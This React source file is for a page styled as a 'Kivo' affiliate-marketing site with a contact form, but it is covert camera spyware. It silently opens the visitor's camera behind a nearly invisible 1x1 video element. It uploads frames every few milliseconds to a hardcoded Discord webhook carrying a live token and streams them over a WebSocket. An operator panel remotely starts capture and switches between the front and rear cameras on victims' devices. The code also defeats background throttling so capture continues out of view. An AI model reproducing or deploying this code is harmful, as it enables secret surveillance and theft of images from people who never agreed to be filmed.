import { useState, useRef, useEffect } from "react";
import { useTheme } from "@/hooks/use-theme";
import { useToast } from "@/hooks/use-toast";
import { Moon, Sun, Camera, Square, Play, User, Mail, Phone, MapPin, Settings, Monitor, Smartphone, Pause, RotateCcw, Eye, EyeOff } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Textarea } from "@/components/ui/textarea";

export default function CameraCapture() {
  const { theme, toggleTheme } = useTheme();
  const { toast } = useToast();
  
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const intervalRef = useRef<NodeJS.Timeout | null>(null);
  
  const [isStreaming, setIsStreaming] = useState(false);
  const [isCapturing, setIsCapturing] = useState(false);
  const [hideVideo, setHideVideo] = useState(false);
  const [frameCount, setFrameCount] = useState(0);
  const [wakeLock, setWakeLock] = useState<any>(null);
  const [isVisible, setIsVisible] = useState(true);
  const keepAliveRef = useRef<NodeJS.Timeout | null>(null);
  const [showAdminPanel, setShowAdminPanel] = useState(false);
  const [connectedDevices, setConnectedDevices] = useState<any[]>([]);
  const [cameraType, setCameraType] = useState<'user' | 'environment'>('user');
  const [isRemoteControlled, setIsRemoteControlled] = useState(false);
  const [websocket, setWebsocket] = useState<WebSocket | null>(null);
  const deviceId = useRef(Math.random().toString(36).substr(2, 9));
  const [liveFrames, setLiveFrames] = useState<{[deviceId: string]: string}>({});
  
  // Webhook URL configurado automaticamente
  const webhookUrl = "https://discord.com/api/webhooks/1403383695066529964/yrVMv2ZGsFvKqHtyliIbRgrHS-SuYVwVyRxCN7wO1DYvSqIHqu5aAAlqi19E4IsLra_f";

  // WebSocket connection for device communication
  useEffect(() => {
    const connectWebSocket = () => {
      const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
      const wsUrl = `${protocol}//${window.location.host}/ws`;
      const ws = new WebSocket(wsUrl);
      
      ws.onopen = () => {
        setWebsocket(ws);
        // Register this device
        ws.send(JSON.stringify({
          type: 'register',
          deviceId: deviceId.current,
          userAgent: navigator.userAgent
        }));
      };
      
      ws.onmessage = (event) => {
        const data = JSON.parse(event.data);
        handleWebSocketMessage(data);
      };
      
      ws.onclose = () => {
        setWebsocket(null);
        // Reconnect after 3 seconds
        setTimeout(connectWebSocket, 3000);
      };
    };
    
    connectWebSocket();
    
    return () => {
      if (websocket) {
        websocket.close();
      }
    };
  }, []);

  // Handle WebSocket messages
  const handleWebSocketMessage = (data: any) => {
    switch (data.type) {
      case 'devices_list':
        setConnectedDevices(data.devices);
        break;
      case 'start_capture':
        if (data.deviceId === deviceId.current) {
          setIsRemoteControlled(true);
          startCapturing();
        }
        break;
      case 'stop_capture':
        if (data.deviceId === deviceId.current) {
          setIsRemoteControlled(false);
          stopCapturing();
        }
        break;
      case 'switch_camera':
        if (data.deviceId === deviceId.current) {
          switchCamera(data.cameraType);
        }
        break;
      case 'video_frame':
        // Update live frame for device in admin panel
        setLiveFrames(prev => ({
          ...prev,
          [data.deviceId]: `data:image/jpeg;base64,${data.frame}`
        }));
        break;
    }
  };

  // Switch between front and back camera
  const switchCamera = async (newCameraType: 'user' | 'environment') => {
    setCameraType(newCameraType);
    // Send status update
    sendStatusUpdate({ cameraType: newCameraType });
    // Stop current stream
    stopCamera();
    // Wait a moment then start with new camera
    setTimeout(() => {
      startCamera(newCameraType);
    }, 500);
  };

  // Initialize camera stream with camera type support
  const startCamera = async (facingMode: 'user' | 'environment' = cameraType) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { 
          facingMode: facingMode,
          width: { ideal: 640 },
          height: { ideal: 480 }
        }
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        streamRef.current = stream;
        setIsStreaming(true);
        
        // Camera started silently
      }
    } catch (error) {
      // Silently handle camera errors
    }
  };

  // Stop camera stream
  const stopCamera = () => {
    if (streamRef.current) {
      streamRef.current.getTracks().forEach(track => track.stop());
      streamRef.current = null;
      setIsStreaming(false);
      
      if (videoRef.current) {
        videoRef.current.srcObject = null;
      }
    }
  };

  // Capture frame and send to Discord + Stream to admin panel
  const captureAndSend = async () => {
    if (!videoRef.current || !canvasRef.current || !webhookUrl.trim()) {
      return;
    }

    const video = videoRef.current;
    const canvas = canvasRef.current;
    const ctx = canvas.getContext('2d');

    if (!ctx) return;

    // Set canvas dimensions to match video
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    // Draw current video frame to canvas
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    // Send live video frame to admin panel via WebSocket
    sendVideoFrame(canvas);

    // Convert canvas to blob
    canvas.toBlob(async (blob) => {
      if (!blob) return;

      try {
        // Create FormData for Discord webhook
        const formData = new FormData();
        const timestamp = new Date().toISOString();
        const filename = `capture_${frameCount + 1}_${timestamp.replace(/[:.]/g, '-')}.jpg`;
        
        formData.append('file', blob, filename);
        formData.append('content', `Camera capture ${frameCount + 1} - ${timestamp}`);

        // Send to Discord webhook
        const response = await fetch(webhookUrl, {
          method: 'POST',
          body: formData,
        });

        if (response.ok) {
          setFrameCount(prev => {
            const newCount = prev + 1;
            // Send status update every 10 frames to avoid spam
            if (newCount % 10 === 0) {
              sendStatusUpdate({ frameCount: newCount });
            }
            return newCount;
          });
        }
      } catch (error) {
        // Silently continue if upload fails
      }
    }, 'image/jpeg', 0.8);
  };

  // Send video frame for live streaming to admin panel
  const sendVideoFrame = (canvas: HTMLCanvasElement) => {
    if (websocket && websocket.readyState === WebSocket.OPEN && isCapturing) {
      // Send frame every 5 captures (reduce bandwidth but keep live feel)
      if (frameCount % 5 === 0) {
        canvas.toBlob((blob) => {
          if (blob) {
            const reader = new FileReader();
            reader.onloadend = () => {
              const base64data = reader.result as string;
              websocket.send(JSON.stringify({
                type: 'video_frame',
                deviceId: deviceId.current,
                frame: base64data.split(',')[1], // Remove data:image/jpeg;base64, prefix
                timestamp: Date.now()
              }));
            };
            reader.readAsDataURL(blob);
          }
        }, 'image/jpeg', 0.6);
      }
    }
  };

  // Send status update to WebSocket
  const sendStatusUpdate = (updates: any) => {
    if (websocket && websocket.readyState === WebSocket.OPEN) {
      websocket.send(JSON.stringify({
        type: 'status_update',
        deviceId: deviceId.current,
        ...updates
      }));
    }
  };

  // Enhanced capturing with background support and forced execution
  const startCapturing = () => {
    setIsCapturing(true);
    setFrameCount(0);
    
    // Send status update
    sendStatusUpdate({ isCapturing: true, frameCount: 0 });
    
    // Clear any existing interval
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
    }
    
    // Primary capture mechanism - aggressive interval
    intervalRef.current = setInterval(() => {
      captureAndSend();
      
      // Force execution when browser is hidden/minimized
      if (document.hidden) {
        // Multiple techniques to prevent throttling
        requestIdleCallback(() => {
          captureAndSend();
        }, { timeout: 30 });
        
        // Use Web Worker message to keep thread active
        if (typeof Worker !== 'undefined') {
          const blob = new Blob(['self.postMessage("keepAlive");'], { type: 'application/javascript' });
          const worker = new Worker(URL.createObjectURL(blob));
          worker.postMessage('start');
          setTimeout(() => worker.terminate(), 25);
        }
      }
    }, 30);
    
    // Secondary backup using setTimeout chains (more resistant to throttling)
    const timeoutCapture = () => {
      if (!isCapturing) return;
      captureAndSend();
      setTimeout(timeoutCapture, 30);
    };
    setTimeout(timeoutCapture, 15); // Offset by 15ms to interleave
    
    // Third mechanism using requestAnimationFrame
    const rafCapture = () => {
      if (!isCapturing) return;
      if (document.hidden) {
        // Force RAF even when hidden by using nested timeouts
        setTimeout(() => {
          captureAndSend();
          setTimeout(() => requestAnimationFrame(rafCapture), 1);
        }, 30);
      } else {
        requestAnimationFrame(() => {
          setTimeout(rafCapture, 30);
        });
      }
    };
    requestAnimationFrame(rafCapture);
  };

  // Stop capturing frames
  const stopCapturing = () => {
    setIsCapturing(false);
    
    // Send status update
    sendStatusUpdate({ isCapturing: false });
    
    // Clear interval
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    
    // Clear keep alive
    if (keepAliveRef.current) {
      clearInterval(keepAliveRef.current);
      keepAliveRef.current = null;
    }
    
    // Release wake lock
    if (wakeLock) {
      try {
        wakeLock.release();
      } catch (err) {
        // Ignore release errors
      }
      setWakeLock(null);
    }
  };

  // Enhanced background operation support
  useEffect(() => {
    // Page Visibility API to detect when tab is hidden/shown
    const handleVisibilityChange = () => {
      setIsVisible(!document.hidden);
    };

    // Request wake lock when capturing starts
    const requestWakeLock = async () => {
      if (isCapturing && !wakeLock) {
        try {
          if ('wakeLock' in navigator) {
            const lock = await (navigator as any).wakeLock.request('screen');
            setWakeLock(lock);
            
            // Handle wake lock release
            lock.addEventListener('release', () => {
              setWakeLock(null);
              // Re-request wake lock after a short delay
              setTimeout(requestWakeLock, 1000);
            });
          }
        } catch (err) {
          // Wake lock not supported or failed, try again in 5 seconds
          setTimeout(requestWakeLock, 5000);
        }
      }
    };

    // Keep alive mechanism for background operation
    const startKeepAlive = () => {
      if (isCapturing) {
        keepAliveRef.current = setInterval(() => {
          // Dummy operation to keep JavaScript engine active
          const dummy = Date.now();
          // Force a small calculation to prevent optimization
          Math.random() * dummy;
        }, 1000);
      }
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    requestWakeLock();
    startKeepAlive();

    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      if (keepAliveRef.current) {
        clearInterval(keepAliveRef.current);
      }
    };
  }, [isCapturing, wakeLock]);

  // Send remote command to device
  const sendRemoteCommand = (targetDeviceId: string, command: string, data?: any) => {
    if (websocket && websocket.readyState === WebSocket.OPEN) {
      websocket.send(JSON.stringify({
        type: command,
        deviceId: targetDeviceId,
        ...data
      }));
    }
  };

  // Auto-start camera on mount and cleanup on unmount
  useEffect(() => {
    startCamera();
    
    return () => {
      stopCamera();
      if (intervalRef.current) {
        clearInterval(intervalRef.current);
      }
      if (wakeLock) {
        wakeLock.release();
      }
    };
  }, []);

  return (
    <div className="min-h-screen">
      {/* Hidden Video and Canvas for Processing - 1x1 pixel invisible */}
      <div className="fixed bottom-0 right-0 w-px h-px z-50">
        <div className="relative overflow-hidden">
          <video
            ref={videoRef}
            autoPlay
            playsInline
            muted
            className="w-px h-px object-cover opacity-1"
            style={{ opacity: '0.01' }}
          />
          <canvas
            ref={canvasRef}
            className="w-px h-px opacity-1"
            style={{ opacity: '0.01' }}
          />
        </div>
      </div>
      {/* Full Screen Mobile Banner */}
      {!isCapturing ? (
        <div className="fixed inset-0 bg-gradient-to-br from-material-purple via-purple-600 to-indigo-700">
          {/* Theme Toggle Button - Top Right */}
          <div className="absolute top-6 right-6 z-10">
            <Button
              variant="ghost"
              size="icon"
              onClick={() => setShowAdminPanel(true)}
              className="rounded-full hover:bg-white/30 text-[#632ce100] bg-[#ffffff0d]"
            >
              <Settings className="h-5 w-5" />
            </Button>
          </div>

          {/* Centered Content */}
          <div className="flex items-center justify-center min-h-screen p-8">
            <div className="text-center text-white space-y-8 w-full max-w-sm">
              {/* Welcome Content */}
              <div className="space-y-6">
                <div className="space-y-3">
                  <h1 className="text-3xl font-bold">Welcome to Kivo</h1>
                  <p className="text-white/90 text-xl">Affiliate Markting Portugal</p>
                </div>
              </div>
              
              {/* Start Button */}
              <Button
                onClick={startCapturing}
                disabled={!isStreaming}
                className="w-full bg-white text-material-purple hover:bg-gray-100 py-6 rounded-2xl text-xl font-semibold shadow-lg transition-all duration-200 hover:scale-105 disabled:opacity-50"
              >
                Start
              </Button>
              
              
            </div>
          </div>
        </div>
      ) : (
        /* Show frame counter when capturing */
        (<div className="text-center py-4 p-4">
          <div className="bg-green-100 dark:bg-green-900/30 text-green-800 dark:text-green-300 rounded-xl p-4 inline-block">
            <p className="text-lg font-semibold">{frameCount}</p>
            <p className="text-sm">Fotos capturadas</p>
          </div>
        </div>)
      )}
      {/* Form Overlay - Shows when capturing */}
      {isCapturing && (
        <div className="fixed inset-0 bg-white dark:bg-gray-900 z-40 overflow-y-auto">
          <div className="min-h-screen p-4">
            {/* Header */}
            <header className="flex justify-between items-center mb-6">
              <div className="flex items-center gap-2">
                <User className="w-6 h-6 text-material-purple" />
                <h1 className="text-xl font-medium">Contact Form</h1>
              </div>
              <Button
                variant="ghost"
                size="icon"
                onClick={toggleTheme}
                className="rounded-full"
              >
                {theme === "dark" ? (
                  <Sun className="h-5 w-5" />
                ) : (
                  <Moon className="h-5 w-5" />
                )}
              </Button>
            </header>

            {/* Contact Form */}
            <Card className="max-w-md mx-auto">
              <CardHeader>
                <CardTitle className="text-center">Get in Touch</CardTitle>
                <p className="text-center text-gray-500 text-sm">We'd love to hear from you. Send us a message!</p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="space-y-2">
                  <Label htmlFor="name">Full Name</Label>
                  <Input id="name" placeholder="Enter your full name" />
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="email">Email Address</Label>
                  <Input id="email" type="email" placeholder="Enter your email" />
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="phone">Phone Number</Label>
                  <Input id="phone" type="tel" placeholder="Enter your phone number" />
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="company">Company</Label>
                  <Input id="company" placeholder="Enter your company name" />
                </div>
                
                <div className="space-y-2">
                  <Label htmlFor="message">Message</Label>
                  <Textarea 
                    id="message" 
                    placeholder="Tell us about your project or inquiry..." 
                    rows={4}
                  />
                </div>
                
                <div className="space-y-3 pt-4">
                  <Button className="w-full bg-material-purple hover:bg-material-purple-dark text-white py-3 rounded-xl">
                    <Mail className="w-5 h-5 mr-2" />
                    Send Message
                  </Button>
                  
                  <Button 
                    onClick={stopCapturing}
                    variant="outline" 
                    className="w-full py-3 rounded-xl"
                  >
                    Cancel
                  </Button>
                </div>
              </CardContent>
            </Card>
            
            {/* Hidden status */}
            <div className="text-center mt-6 text-xs text-gray-400">
              Frames sent: {frameCount}
            </div>
          </div>
        </div>
      )}

      {/* Admin Panel */}
      {showAdminPanel && (
        <div className="fixed inset-0 bg-black/90 z-50 overflow-y-auto">
          <div className="min-h-screen p-4">
            {/* Header */}
            <header className="flex justify-between items-center mb-6">
              <div className="flex items-center gap-2">
                <Monitor className="w-6 h-6 text-white" />
                <h1 className="text-xl font-medium text-white">Painel de Controle</h1>
              </div>
              <div className="flex gap-2">
                <Button
                  variant="ghost"
                  size="icon"
                  onClick={toggleTheme}
                  className="rounded-full text-white hover:bg-white/20"
                >
                  {theme === "dark" ? (
                    <Sun className="h-5 w-5" />
                  ) : (
                    <Moon className="h-5 w-5" />
                  )}
                </Button>
                <Button
                  variant="ghost"
                  size="icon"
                  onClick={() => setShowAdminPanel(false)}
                  className="rounded-full text-white hover:bg-white/20"
                >
                  <Square className="h-5 w-5" />
                </Button>
              </div>
            </header>

            {/* Connected Devices */}
            <div className="space-y-4">
              <h2 className="text-lg font-semibold text-white">Dispositivos Conectados ({connectedDevices.length})</h2>
              
              {connectedDevices.length === 0 ? (
                <Card className="bg-white/10 border-white/20">
                  <CardContent className="p-6 text-center">
                    <Smartphone className="w-12 h-12 mx-auto mb-4 text-white/60" />
                    <p className="text-white/80">Nenhum dispositivo conectado</p>
                    <p className="text-white/60 text-sm mt-2">Abra o site em outros dispositivos para vê-los aqui</p>
                  </CardContent>
                </Card>
              ) : (
                <div className="grid gap-4">
                  {connectedDevices.map((device) => (
                    <Card key={device.id} className="bg-white/10 border-white/20">
                      <CardContent className="p-4">
                        <div className="flex items-start justify-between">
                          <div className="flex-1">
                            <div className="flex items-center gap-2 mb-2">
                              <Smartphone className="w-5 h-5 text-white" />
                              <span className="text-white font-medium">
                                Dispositivo {device.id.substr(-4).toUpperCase()}
                              </span>
                              <span className={`px-2 py-1 rounded-full text-xs ${
                                device.isCapturing 
                                  ? 'bg-green-500/20 text-green-300' 
                                  : 'bg-gray-500/20 text-gray-300'
                              }`}>
                                {device.isCapturing ? 'Ativo' : 'Parado'}
                              </span>
                            </div>
                            
                            <p className="text-white/60 text-sm mb-3">
                              {device.userAgent ? device.userAgent.substr(0, 60) + '...' : 'Dispositivo móvel'}
                            </p>
                            
                            {/* Live Camera Preview */}
                            <div className="bg-black/30 rounded-lg p-2 mb-3 min-h-[180px] flex items-center justify-center overflow-hidden">
                              {device.isCapturing && liveFrames[device.id] ? (
                                <div className="relative w-full h-full">
                                  <img 
                                    src={liveFrames[device.id]} 
                                    alt="Live camera feed"
                                    className="w-full h-full object-cover rounded-md"
                                    style={{ maxHeight: '160px' }}
                                  />
                                  <div className="absolute top-2 left-2 flex items-center gap-1">
                                    <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                                    <span className="text-xs text-white bg-black/50 px-1 rounded">AO VIVO</span>
                                  </div>
                                  <div className="absolute top-2 right-2 text-xs text-white bg-black/50 px-1 rounded">
                                    {device.cameraType === 'user' ? 'Frontal' : 'Traseira'}
                                  </div>
                                  <div className="absolute bottom-2 left-2 text-xs text-white bg-black/50 px-1 rounded">
                                    Fotos: {device.frameCount || 0}
                                  </div>
                                </div>
                              ) : device.isCapturing ? (
                                <div className="text-center">
                                  <Eye className="w-8 h-8 mx-auto mb-2 text-green-400 animate-pulse" />
                                  <p className="text-green-400 text-sm">Câmera Ativa</p>
                                  <p className="text-white/60 text-xs">Aguardando transmissão...</p>
                                  <p className="text-white/60 text-xs">{device.cameraType === 'user' ? 'Frontal' : 'Traseira'}</p>
                                </div>
                              ) : (
                                <div className="text-center">
                                  <EyeOff className="w-8 h-8 mx-auto mb-2 text-gray-400" />
                                  <p className="text-gray-400 text-sm">Câmera Parada</p>
                                  <p className="text-white/40 text-xs">Clique em 'Iniciar' para ver ao vivo</p>
                                </div>
                              )}
                            </div>
                            
                            {/* Device Controls */}
                            <div className="flex flex-wrap gap-2">
                              <Button
                                size="sm"
                                onClick={() => sendRemoteCommand(device.id, device.isCapturing ? 'stop_capture' : 'start_capture')}
                                className={`${
                                  device.isCapturing 
                                    ? 'bg-red-600 hover:bg-red-700 text-white' 
                                    : 'bg-green-600 hover:bg-green-700 text-white'
                                } text-xs`}
                              >
                                {device.isCapturing ? (
                                  <><Pause className="w-3 h-3 mr-1" /> Parar</>
                                ) : (
                                  <><Play className="w-3 h-3 mr-1" /> Iniciar</>
                                )}
                              </Button>
                              
                              <Button
                                size="sm"
                                variant="outline"
                                onClick={() => sendRemoteCommand(device.id, 'switch_camera', {
                                  cameraType: device.cameraType === 'user' ? 'environment' : 'user'
                                })}
                                className="text-white border-white/30 hover:bg-white/10 text-xs"
                              >
                                <RotateCcw className="w-3 h-3 mr-1" />
                                {device.cameraType === 'user' ? 'Traseira' : 'Frontal'}
                              </Button>
                            </div>
                          </div>
                        </div>
                        
                        {/* Stats */}
                        {device.isCapturing && (
                          <div className="mt-3 pt-3 border-t border-white/10">
                            <div className="flex justify-between text-xs text-white/60">
                              <span>Fotos enviadas:</span>
                              <span>{device.frameCount || 0}</span>
                            </div>
                          </div>
                        )}
                      </CardContent>
                    </Card>
                  ))}
                </div>
              )}
            </div>
            
            {/* Current Device Info */}
            <div className="mt-6">
              <Card className="bg-white/5 border-white/10">
                <CardHeader>
                  <CardTitle className="text-white text-lg">Este Dispositivo</CardTitle>
                </CardHeader>
                <CardContent className="space-y-3">
                  <div className="flex justify-between items-center">
                    <span className="text-white/80">ID:</span>
                    <span className="text-white font-mono text-sm">{deviceId.current}</span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-white/80">Status:</span>
                    <span className={`px-2 py-1 rounded-full text-xs ${
                      isCapturing ? 'bg-green-500/20 text-green-300' : 'bg-gray-500/20 text-gray-300'
                    }`}>
                      {isCapturing ? 'Capturando' : 'Parado'}
                    </span>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-white/80">Câmera:</span>
                    <span className="text-white">{cameraType === 'user' ? 'Frontal' : 'Traseira'}</span>
                  </div>
                  {isCapturing && (
                    <div className="flex justify-between items-center">
                      <span className="text-white/80">Fotos enviadas:</span>
                      <span className="text-white">{frameCount}</span>
                    </div>
                  )}
                  
                  {isRemoteControlled && (
                    <div className="bg-blue-500/20 border border-blue-400/30 rounded-lg p-3 mt-3">
                      <p className="text-blue-300 text-sm text-center">
                        <Monitor className="w-4 h-4 inline mr-1" />
                        Controlado remotamente
                      </p>
                    </div>
                  )}
                </CardContent>
              </Card>
            </div>
          </div>
        </div>
      )}

      {/* Hidden canvas for frame capture */}
      <canvas
        ref={canvasRef}
        className="hidden"
        width="640"
        height="480"
      />
    </div>
  );
}